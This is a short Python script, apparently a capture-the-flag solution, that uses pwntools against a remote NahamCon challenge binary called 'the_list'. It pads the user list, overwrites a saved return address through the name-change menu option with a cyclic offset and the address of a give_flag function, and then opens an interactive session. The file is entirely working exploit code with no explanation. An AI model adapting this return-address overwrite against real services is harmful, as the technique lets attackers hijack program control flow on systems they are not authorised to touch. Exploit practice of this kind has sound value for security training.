#! /usr/bin/python3 
import pwn

elf = pwn.ELF('./the_list')
#p = elf.process()
p = pwn.remote("challenge.nahamcon.com", 32522)

give_flag = pwn.p64(0x0000000000401369)
offset = pwn.cyclic(8)

p.sendlineafter("Enter your name: ", "gu1mas")

for i in range(0x248 // 0x20 - 1):
    p.sendlineafter("> ","2")
    p.sendlineafter("Enter the user's name: ", "A")


payload = [
    offset,
    give_flag
]

payload = b"".join(payload)

p.sendlineafter("> ", "4")
p.sendlineafter("What is the number for the user whose name you want to change? ", "19")
p.sendlineafter("What is the new user's name? ", payload)

p.sendlineafter('> ', '5')
p.interactive()
